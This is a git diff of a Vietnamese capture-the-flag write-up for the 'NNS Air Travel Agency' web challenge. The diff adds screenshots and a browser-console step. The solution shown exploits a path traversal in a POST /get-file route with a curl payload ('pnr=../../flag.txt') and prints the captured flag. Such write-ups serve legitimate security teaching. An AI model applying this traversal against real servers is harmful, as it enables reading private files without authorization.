@@ -17,6 +17,10 @@ The flag is located at `/flag.txt`.
 File: [web_nns-travel.tar.gz](https://github.com/Drakie14/Challenges/blob/NNS-CTF/web_nns-travel.tar.gz)
 
 ## Solution
+Truy cập trang, ta thấy giao diện của "NNS Air Travel Agency":
+
+![image](./01-site.png)
+
 Server chỉ có một route đáng chú ý là `POST /get-file` (`src/index.ts`):
 
 ```ts!
@@ -37,5 +41,9 @@ WORKDIR container là `/app` (xem `Dockerfile`), nên `./tickets/` = `/app/ticke
 ```bash!
 curl -s -X POST "http://HOST:PORT/get-file?pnr=../../flag.txt"
 ```
+
+Muốn tương tác thẳng trên trình duyệt, ta mở DevTools Console rồi `fetch` tới endpoint với payload traversal — server trả về nội dung `/flag.txt`:
+
+![image](./02-flag.png)
 
 -> Flag: `NNS{WH0op5_You_found_4_p4th_7R4v3rs4l_in_My_cod3}`
